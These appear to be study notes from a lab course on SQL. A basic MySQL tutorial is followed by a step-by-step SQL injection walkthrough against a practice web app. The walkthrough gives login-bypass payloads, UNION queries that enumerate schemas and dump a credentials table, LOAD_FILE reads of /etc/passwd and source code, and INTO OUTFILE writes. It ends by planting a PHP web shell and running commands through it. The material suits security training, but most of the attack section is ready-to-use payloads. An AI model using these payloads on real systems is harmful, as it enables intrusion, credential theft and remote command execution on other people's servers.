# Databases

## Types of Databases

Databases, in general, are categorized into `Relational Databases` and `Non-Relational Databases`. Only Relational Databases utilize SQL, while Non-Relational databases utilize a variety of methods for communications.

# MySQL

## 1.Intro to MySQL

```shell-session
mysql -u root -p

mysql -u root -p<password>

mysql -u root -h docker.hackthebox.eu -P 3306 -p 
```

### Creating a database

```shell-session
mysql> CREATE DATABASE users;
```

```shell-session
mysql> SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+

mysql> USE users;
```

## Tables

```sql
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );
```

```shell-session
mysql> CREATE TABLE logins (
    ->     id INT,
    ->     username VARCHAR(100),
    ->     password VARCHAR(100),
    ->     date_of_joining DATETIME
    ->     );
```

```shell-session
mysql> SHOW TABLES;

+-----------------+
| Tables_in_users |
+-----------------+
| logins          |
+-----------------+
```

```shell-session
mysql> DESCRIBE logins;
```

### **Table Properties**

```sql
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );
```

## 2.SQL Statements

### INSERT Statement

```sql
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
```

```shell-session
mysql> INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
```

```sql
INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);
```

```shell-session
mysql> INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
```

> We can also insert multiple records at once by separating them with a comma:

```shell-session
mysql> INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
```

### SELECT Statement

```sql
SELECT * FROM table_name;
SELECT column1, column2 FROM table_name;
```

```shell-session
mysql> SELECT * FROM logins;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+



mysql> SELECT username,password FROM logins;

+---------------+------------+
| username      | password   |
+---------------+------------+
| admin         | p@ssw0rd   |
| administrator | adm1n_p@ss |
| john          | john123!   |
| tom           | tom123!    |
+---------------+------------+
```

### DROP Statement

```shell-session
mysql> DROP TABLE logins;
mysql> SHOW TABLES;
```

### ALTER Statement

```shell-session
mysql> ALTER TABLE logins ADD newColumn INT;
mysql> ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;
mysql> ALTER TABLE logins MODIFY newerColumn DATE;
mysql> ALTER TABLE logins DROP newerColumn;
```

### UPDATE Statement

```sql
UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
```

```shell-session
mysql> UPDATE logins SET password = 'change_password' WHERE id > 1;
mysql> SELECT * FROM logins;
```

## 3.Query Results

### Sorting Results

```shell-session
mysql> SELECT * FROM logins ORDER BY password;
mysql> SELECT * FROM logins ORDER BY password DESC;
mysql> SELECT * FROM logins ORDER BY password DESC, id ASC;
```

### LIMIT results

```shell-session
mysql> SELECT * FROM logins LIMIT 2;
mysql> SELECT * FROM logins LIMIT 1, 2;
```

### WHERE Clause

```sql
SELECT * FROM table_name WHERE <condition>;
```

```shell-session
mysql> SELECT * FROM logins WHERE id > 1;
mysql> SELECT * FROM logins where username = 'admin';
```

### LIKE Clause

```shell-session
mysql> SELECT * FROM logins WHERE username LIKE 'admin%';
mysql> SELECT * FROM logins WHERE username like '___';
```

## 4.SQL Operators

### AND Operator

```sql
condition1 AND condition2
```

```shell-session
mysql> SELECT 1 = 1 AND 'test' = 'test';
mysql> SELECT 1 = 1 AND 'test' = 'abc';
```

### OR Operator

```shell-session
mysql> SELECT 1 = 1 OR 'test' = 'abc';
mysql> SELECT 1 = 2 OR 'test' = 'abc';
```

### NOT Operator

```shell-session
mysql> SELECT NOT 1 = 1;
mysql> SELECT NOT 1 = 2;
```

## Symbol Operators

> The `AND`, `OR` and `NOT` operators can also be represented as `&&`, `||` and `!`, respectively.

```shell-session
mysql> SELECT 1 = 1 && 'test' = 'abc';
mysql> SELECT 1 = 1 || 'test' = 'abc';
mysql> SELECT 1 != 1;
```

### Operators in queries

```shell-session
mysql> SELECT * FROM logins WHERE username != 'john';
mysql> SELECT * FROM logins WHERE username != 'john' AND id > 1;
```

## Multiple Operator Precedence

> SQL supports various other operations such as addition, division as well as bitwise operations. Thus, a query could have multiple expressions with multiple operations at once. The order of these operations is decided through operator precedence.
>
> Here is a list of common operations and their precedence, as seen in the [MariaDB Documentation](https://mariadb.com/kb/en/operator-precedence/):
>
> * Division (`/`), Multiplication (`*`), and Modulus (`%`)
> * Addition (`+`) and subtraction (`-`)
> * Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
> * NOT (`!`)
> * AND (`&&`)
> * OR (`||`)

```sql
SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
```

> The query has four operations: `!=`, `AND`, `>`, and `-`. From the operator precedence, we know that subtraction comes first, so it will first evaluate `3 - 2` to `1`:

```sql
SELECT * FROM logins WHERE username != 'tom' AND id > 1;
```

```shell-session
mysql> select * from logins where username != 'tom' AND id > 3 - 2;
```

<br>

    ---

# SQL Injections

## 1.Subverting Query Logic

## Authentication Bypass

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F5mjIremv8jgnSoX91kTW%2Fimage.png?alt=media&amp;token=3ce43330-fe63-4ca5-9462-36b0e6f855bc" alt=""><figcaption></figcaption></figure>

> We can log in with the administrator credentials `admin / p@ssw0rd`.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FYB0SJ4oB70qDtqikKsnz%2Fimage.png?alt=media&amp;token=557e9e35-f3f8-4c86-97c6-7de4d4adb291" alt=""><figcaption></figcaption></figure>

> The page also displays the SQL query being executed to understand better how we will subvert the query logic. Our goal is to log in as the admin user without using the existing password. As we can see, the current SQL query being executed is:

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FvusdCxCNoIisjY9IR2OR%2Fimage.png?alt=media&amp;token=e092624b-e657-4a5f-9c1c-b9c60840cd96" alt=""><figcaption></figcaption></figure>

## SQLi Discovery

> Before we start subverting the web application's logic and attempting to bypass the authentication, we first have to test whether the login form is vulnerable to SQL injection. To do that, we will try to add one of the below payloads after our username and see if it causes any errors or changes how the page behaves:

| Payload | URL Encoded |
| ------- | ----------- |
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |

> Note: In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.

So, let us start by injecting a single quote:

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FqLltODzBFOWo6EgAJfVG%2Fimage.png?alt=media&amp;token=bc2d6fa2-d86a-4fbc-a03e-2d4bf29c4efc" alt=""><figcaption></figcaption></figure>

### OR Injection

```sql
admin' or '1'='1
```

This means the following:

* If username is `admin`\
  `OR`
* If `1=1` return `true` 'which always returns `true`'\
  `AND`
* If password is `something`

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F8asGqdTBhuso0pKXxTC5%2Fimage.png?alt=media&amp;token=d7dcbf17-70e0-4203-a99f-97434ea708e0" alt=""><figcaption></figcaption></figure>

> <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass>

## Auth Bypass with OR operator

Let us try this as the username and see the response.&#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/33/inject_success.png" alt=""><figcaption></figcaption></figure>

We were able to log in successfully as admin. However, what if we did not know a valid username? Let us try the same request with a different username this time.

![Admin panel showing an SQL query execution: SELECT \* FROM logins WHERE username='notAdmin' OR '1'='1' AND password='something'; with a message: Login failed!](https://academy.hackthebox.com/storage/modules/33/notadmin_fail.png)

The login failed because `notAdmin` does not exist in the table and resulted in a false query overall.

![SQL query logic diagram: SELECT \* FROM logins WHERE username='notAdmin' OR '1'='1' AND password='something'. Logic flow shows OR condition as False, making the entire statement False](https://academy.hackthebox.com/storage/modules/33/notadmin_diagram_1.png)

To successfully log in once again, we will need an overall `true` query. This can be achieved by injecting an `OR` condition into the password field, so it will always return `true`. Let us try `something' or '1'='1` as the password.

![Admin panel showing an SQL query execution: SELECT \* FROM logins WHERE username='notAdmin' OR '1'='1' AND password='something' OR '1'='1'; with a message: Login successful as user: admin](https://academy.hackthebox.com/storage/modules/33/password_or_injection.png)

The additional `OR` condition resulted in a `true` query overall, as the `WHERE` clause returns everything in the table, and the user present in the first row is logged in. In this case, as both conditions will return `true`, we do not have to provide a test username and password and can directly start with the `'` injection and log in with just `' or '1' = '1`.

![Admin panel showing an SQL query execution: SELECT \* FROM logins WHERE username='' OR '1'='1' AND password='something' OR '1'='1'; with a message: Login successful as user: admin](https://academy.hackthebox.com/storage/modules/33/basic_auth_bypass.png)

This works since the query evaluate to `true` irrespective of the username or password.

## 2.Using Comments

## Comments

```shell-session
mysql> SELECT username FROM logins; -- Selects usernames from the logins table 
mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
```

## Auth Bypass with comments

Let us go back to our previous example and inject `admin'--` as our username. The final query will be:

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FelOXT8wvpEKS7hoi7Giv%2Fimage.png?alt=media&amp;token=dc7f63f4-ad8d-49b2-8618-278fb9a8fe0e" alt=""><figcaption></figcaption></figure>

### Another Example

SQL supports the usage of parenthesis if the application needs to check for particular conditions before others. Expressions within the parenthesis take precedence over other operators and are evaluated first. Let us look at a scenario like this:

![Admin panel showing an SQL query execution: SELECT \* FROM logins WHERE (username='admin' AND id > 1) AND password='437b930db84b8079c2dd804a71936b5f'; with a message: Login failed!](https://academy.hackthebox.com/storage/modules/33/paranthesis_fail.png)

The above query ensures that the user's id is always greater than 1, which will prevent anyone from logging in as admin. Additionally, we also see that the password was hashed before being used in the query. This will prevent us from injecting through the password field because the input is changed to a hash.

Let us try logging in with valid credentials `admin / p@ssw0rd` to see the response.

![Admin panel showing an SQL query execution: SELECT \* FROM logins WHERE (username='admin' AND id > 1) AND password='0f359740bd1cda994f8b55330c86d845'; with a message: Login failed!](https://academy.hackthebox.com/storage/modules/33/paranthesis_valid_fail.png)

As expected, the login failed even though we supplied valid credentials because the admin’s ID equals 1. So let us try logging in with the credentials of another user, such as `tom`.

![Admin panel showing an SQL query execution: SELECT \* FROM logins WHERE (username='tom' AND id > 1) AND password='f86a3c565937e6315864d1a43c48e7'; with a message: Login successful as user: tom"](https://academy.hackthebox.com/storage/modules/33/tom_login.png)

Logging in as the user with an id not equal to 1 was successful. So, how can we log in as the admin? We know from the previous section on comments that we can use them to comment out the rest of the query. So, let us try using `admin'--` as the username.

![Admin panel showing an SQL query execution: SELECT \* FROM logins WHERE (username='admin'--' AND id > 1) AND password='437b930db84b8079c2dd804a71936b5f'; with an error message: You have an error in your SQL syntax; check the manual for the right syntax near '437b930db84b8079c2dd804a71936b5f' at line 1](https://academy.hackthebox.com/storage/modules/33/paranthesis_error.png)

The login failed due to a syntax error, as a closed one did not balance the open parenthesis. To execute the query successfully, we will have to add a closing parenthesis. Let us try using the username `admin')--` to close and comment out the rest.

![Admin panel showing an SQL query execution: SELECT \* FROM logins WHERE (username='admin'--' AND id > 1) AND password='437b930db84b8079c2dd804a71936b5f'; with a message: Login successful as user: admin"](https://academy.hackthebox.com/storage/modules/33/paranthesis_success.png)

The query was successful, and we logged in as admin. The final query as a result of our input is:

```sql
SELECT * FROM logins where (username='admin')
```

## 3.Union Clause

## Union

```shell-session
mysql> SELECT * FROM ports;
mysql> SELECT * FROM ships;
mysql> SELECT * FROM ports UNION SELECT * FROM ships;
```

### Even Columns

```shell-session
mysql> SELECT city FROM ports UNION SELECT * FROM ships;
```

### Un-even Columns

```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```

```shell-session
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '
```

## 4.Union Injection

Now that we know how the Union clause works and how to use it let us learn how to utilize it in our SQL injections. Let us take the following example:

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FtwnmsW3TLlKiQM53HZuI%2Fimage.png?alt=media&amp;token=c7ca6c02-f870-4e09-94df-a4dd480efc66" alt=""><figcaption></figcaption></figure>

We apply the SQLi Discovery steps by injecting a single quote (`'`), and we do get an error:

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FyRDu00TlrY925LoqfeBu%2Fimage.png?alt=media&amp;token=40efeae6-c155-40ef-b3c0-efdaf58428aa" alt=""><figcaption></figcaption></figure>

### Detect number of columns

* Using `ORDER BY`
* Using `UNION`

### **Using ORDER BY**

```sql
' order by 1-- -
' order by 2-- -
' order by 3-- -
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FfJ0Egp4a76FYz3KlKleH%2Fimage.png?alt=media&amp;token=bccdb523-5410-4677-a528-6c57fddb5070" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FffotHx4G7vMgWqrzlVAA%2Fimage.png?alt=media&amp;token=797de649-32f6-40b2-8f25-d402309c25e3" alt=""><figcaption></figcaption></figure>

### **Using UNION**

```sql
cn' UNION select 1,2,3-- -
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FfKs7WaJvKEcmIWa3d7XU%2Fimage.png?alt=media&amp;token=89f29cfe-0a5b-4dc1-81ba-30c031d0e8b2" alt=""><figcaption></figcaption></figure>

```sql
cn' UNION select 1,2,3,4-- -
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FNIJSlR0Fz5rMtEnRXm8O%2Fimage.png?alt=media&amp;token=36f7659a-fc55-46f4-9cd0-67a873d49a27" alt=""><figcaption></figcaption></figure>

```sql
cn' UNION select 1,@@version,3,4-- -
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F0Iyr97Gv9gMK2vnAfmWs%2Fimage.png?alt=media&amp;token=5bf7f469-6c74-4206-84e3-e0b959f15b74" alt=""><figcaption></figcaption></figure>


    ---

# Exploitation

## 1.Database Enumeration

## MySQL Fingerprinting

| Payload            | When to Use                      | Expected Output                                     | Wrong Output                                              |
| ------------------ | -------------------------------- | --------------------------------------------------- | --------------------------------------------------------- |
| `SELECT @@version` | When we have full query output   | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'     | In MSSQL it returns MSSQL version. Error with other DBMS. |
| `SELECT POW(1,1)`  | When we only have numeric output | `1`                                                 | Error with other DBMS                                     |
| `SELECT SLEEP(5)`  | Blind/No Output                  | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS                   |

&#x20;when we tried `@@version`, it gave us:

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FuaD94Q0nIi8EMejKnVjd%2Fimage.png?alt=media&amp;token=c7716c05-8aac-4f77-9d24-1a43bff619ab" alt=""><figcaption></figcaption></figure>

### INFORMATION\_SCHEMA Database

> To pull data from tables using `UNION SELECT`, we need to properly form our `SELECT` queries. To do so, we need the following information:
>
> * List of databases
> * List of tables within each database
> * List of columns within each table
>
> With the above information, we can form our `SELECT` statement to dump data from any column in any table within any database inside the DBMS. This is where we can utilize the `INFORMATION_SCHEMA` Database.
>
> The [INFORMATION\_SCHEMA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html) database contains metadata about the databases and tables present on the server. This database plays a crucial role while exploiting SQL injection vulnerabilities. As this is a different database, we cannot call its tables directly with a `SELECT` statement. If we only specify a table's name for a `SELECT` statement, it will look for tables within the same database.
>
> So, to reference a table present in another DB, we can use the dot ‘`.`’ operator. For example, to `SELECT` a table `users` present in a database named `my_database`, we can use:

```sql
SELECT * FROM my_database.users;
```

### SCHEMATA

```shell-session
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

Now, let's do the same using a `UNION` SQL injection, with the following payload:

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FkALpYBWeNHj1iq7JHf9d%2Fimage.png?alt=media&amp;token=33dd8bcc-c8f8-4c11-ae6e-ee43dc2f2da1" alt=""><figcaption></figcaption></figure>

```sql
cn' UNION select 1,database(),2,3-- -
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Ffrox0W8luG2QqvriRs4v%2Fimage.png?alt=media&amp;token=66bc246d-c114-439f-99ec-da34df297bf9" alt=""><figcaption></figcaption></figure>

### TABLES

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FZCjJ84VybztgT6oNCgnm%2Fimage.png?alt=media&amp;token=fa99fe47-5d9f-4cbb-a33a-a1a809379f0a" alt=""><figcaption></figcaption></figure>

### COLUMNS

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FDrg66VKqOV1v53NMNKQx%2Fimage.png?alt=media&amp;token=7b3439cc-5e6c-46ce-8287-7ac382792b9d" alt=""><figcaption></figcaption></figure>

### Data

```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FskLk0DIHYU7p2shB8Td9%2Fimage.png?alt=media&amp;token=b5d49b02-d0c0-4779-be6f-da6c78a9df70" alt=""><figcaption></figcaption></figure>

## 2.Reading Files

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -

cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

### LOAD\_FILE

```sql
SELECT LOAD_FILE('/etc/passwd');
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

## Another Example

We know that the current page is `search.php`. The default Apache webroot is `/var/www/html`. Let us try reading the source code of the file at `/var/www/html/search.php`.

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

## 3.Writing Files

### Write File Privileges

To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

We have already found that our current user has the `FILE` privilege necessary to write files. We must now check if the MySQL database has that privilege. This can be done by checking the `secure_file_priv` global variable.

### **secure\_file\_priv**

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Fg4ff9o9cLRhN0ySsvTHV%2Fimage.png?alt=media&amp;token=81c78484-053b-4418-80f2-dcf5b7861fb4" alt=""><figcaption></figcaption></figure>

### SELECT INTO OUTFILE

```shell-session
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

```shell-session
cat /tmp/credentials 
```

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

```shell-session
cat /tmp/test.txt 
```

```shell-session
ls -la /tmp/test.txt 
```

### Writing Files through SQL Injection

```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

> Note: To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FGycBkudUunSfYIIgqumI%2Fimage.png?alt=media&amp;token=4e297d18-a605-4536-af4e-a90d71f021ea" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F3ZVPqZ5yBioT9KRQdbvN%2Fimage.png?alt=media&amp;token=ad5bc448-80c1-4174-a237-ffb42722c621" alt=""><figcaption></figcaption></figure>

### Writing a Web Shell

```php
<?php system($_REQUEST[0]); ?>
```

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FsvCZB2BJnqXiT2ckIp67%2Fimage.png?alt=media&amp;token=248f9eaf-b178-4b7f-af64-138e9e1912ed" alt=""><figcaption></figcaption></figure>

**<http://example.com/shell.php?0=id>**

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FzS8Sj4hOacI5CCtCD9nU%2Fimage.png?alt=media&amp;token=e2e6884d-7003-4b8c-a3d7-782346fa8155" alt=""><figcaption></figcaption></figure>
